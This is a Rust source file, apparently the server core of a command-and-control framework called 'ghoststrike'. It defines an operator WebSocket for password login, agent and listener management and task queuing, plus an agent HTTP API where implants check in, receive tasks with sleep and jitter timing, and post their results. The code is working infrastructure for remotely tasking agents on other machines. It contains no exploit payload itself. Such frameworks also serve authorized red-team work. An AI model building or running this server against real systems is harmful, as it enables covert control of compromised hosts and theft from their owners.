/// Operator WebSocket endpoint + agent HTTP API, running on the same Axum router.
use std::net::SocketAddr;

use axum::{
    extract::{
        ws::{Message, WebSocket, WebSocketUpgrade},
        State,
    },
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use futures::{SinkExt, StreamExt};
use tracing::{info, warn};
use uuid::Uuid;

use ghoststrike_common::{AgentCheckinReq, AgentCheckinResp, OperatorMsg, TaskResultReq};

use crate::{
    config::ServerConfig,
    listeners,
    state::SharedState,
};

pub async fn serve(state: SharedState, cfg: &ServerConfig) -> anyhow::Result<()> {
    let app = Router::new()
        // Operator WebSocket
        .route("/ws", get(operator_ws_handler))
        // Agent HTTP API
        .route("/api/checkin",    post(agent_checkin))
        .route("/api/taskresult", post(agent_task_result))
        .with_state(state.clone());

    let addr: SocketAddr = format!("{}:{}", cfg.bind_host, cfg.operator_port).parse()?;
    info!("Operator + Agent API listening on {addr}");

    let listener = tokio::net::TcpListener::bind(addr).await?;
    axum::serve(listener, app).await?;
    Ok(())
}

// ── Operator WebSocket ────────────────────────────────────────────────────────

async fn operator_ws_handler(
    ws: WebSocketUpgrade,
    State(state): State<SharedState>,
) -> impl IntoResponse {
    ws.on_upgrade(|socket| operator_session(socket, state))
}

async fn operator_session(socket: WebSocket, state: SharedState) {
    let (mut tx, mut rx) = socket.split();
    let mut broadcast_rx = state.subscribe();
    let mut authed = false;
    let mut operator_name = String::from("unknown");

    loop {
        tokio::select! {
            msg = rx.next() => {
                let msg = match msg {
                    Some(Ok(m)) => m,
                    _ => break,
                };
                let text = match msg {
                    Message::Text(t) => t.to_string(),
                    Message::Close(_) => break,
                    _ => continue,
                };
                let op_msg: OperatorMsg = match serde_json::from_str(&text) {
                    Ok(m) => m,
                    Err(e) => {
                        let err = OperatorMsg::Error { message: e.to_string() };
                        let _ = tx.send(Message::Text(serde_json::to_string(&err).unwrap().into())).await;
                        continue;
                    }
                };

                if !authed {
                    if let OperatorMsg::Auth { password } = &op_msg {
                        if *password == state.config.password {
                            authed = true;
                            operator_name = format!("op-{}", &Uuid::new_v4().to_string()[..8]);
                            let reply = OperatorMsg::AuthOk {
                                operator_id: Uuid::new_v4(),
                                server_name: state.config.server_name.clone(),
                            };
                            let _ = tx.send(Message::Text(serde_json::to_string(&reply).unwrap().into())).await;
                            info!("Operator authenticated: {operator_name}");
                            let _ = state.broadcast.send(OperatorMsg::OperatorJoined {
                                name: operator_name.clone(),
                            });
                        } else {
                            let reply = OperatorMsg::AuthFail { reason: "Bad password".into() };
                            let _ = tx.send(Message::Text(serde_json::to_string(&reply).unwrap().into())).await;
                        }
                    }
                    continue;
                }

                handle_operator_msg(op_msg, &state, &mut tx).await;
            }

            bcast = broadcast_rx.recv() => {
                if let Ok(msg) = bcast {
                    if let Ok(json) = serde_json::to_string(&msg) {
                        if tx.send(Message::Text(json.into())).await.is_err() {
                            break;
                        }
                    }
                }
            }
        }
    }

    info!("Operator disconnected: {operator_name}");
    let _ = state.broadcast.send(OperatorMsg::OperatorLeft { name: operator_name });
}

async fn handle_operator_msg(
    msg: OperatorMsg,
    state: &SharedState,
    tx: &mut futures::stream::SplitSink<WebSocket, Message>,
) {
    match msg {
        OperatorMsg::ListAgents => {
            let agents = state.list_agents().await;
            let reply = OperatorMsg::AgentList { agents };
            send_msg(tx, reply).await;
        }

        OperatorMsg::ListListeners => {
            let list = state.list_listeners().await;
            let reply = OperatorMsg::ListenerList { listeners: list };
            send_msg(tx, reply).await;
        }

        OperatorMsg::StartListener { config } => {
            match listeners::start(state.clone(), config).await {
                Ok(cfg) => send_msg(tx, OperatorMsg::ListenerStarted { config: cfg }).await,
                Err(e)  => send_msg(tx, OperatorMsg::Error { message: e.to_string() }).await,
            }
        }

        OperatorMsg::StopListener { id } => {
            match listeners::stop(state.clone(), id).await {
                Ok(_)  => send_msg(tx, OperatorMsg::ListenerStopped { id }).await,
                Err(e) => send_msg(tx, OperatorMsg::Error { message: e.to_string() }).await,
            }
        }

        OperatorMsg::TaskAgent { task } => {
            state.queue_task(task.clone()).await;
            info!("Task {} queued for agent {}", task.id, task.agent_id);
        }

        _ => {
            warn!("Unhandled operator message variant");
        }
    }
}

async fn send_msg(
    tx: &mut futures::stream::SplitSink<WebSocket, Message>,
    msg: OperatorMsg,
) {
    if let Ok(json) = serde_json::to_string(&msg) {
        let _ = tx.send(Message::Text(json.into())).await;
    }
}

// ── Agent HTTP API ────────────────────────────────────────────────────────────

async fn agent_checkin(
    State(state): State<SharedState>,
    Json(req): Json<AgentCheckinReq>,
) -> Json<AgentCheckinResp> {
    state.upsert_agent(req.info).await;
    let tasks = state.pending_tasks_for(req.agent_id).await;
    let (sleep_ms, jitter_pct) = {
        let agents = state.agents.read().await;
        agents
            .get(&req.agent_id)
            .map(|a| (a.sleep_ms, a.jitter_pct))
            .unwrap_or((5000, 10))
    };
    Json(AgentCheckinResp { tasks, sleep_ms, jitter_pct })
}

async fn agent_task_result(
    State(state): State<SharedState>,
    Json(req): Json<TaskResultReq>,
) -> Json<serde_json::Value> {
    state
        .update_task_result(req.agent_id, req.task_id, req.output, req.success)
        .await;
    Json(serde_json::json!({ "ok": true }))
}
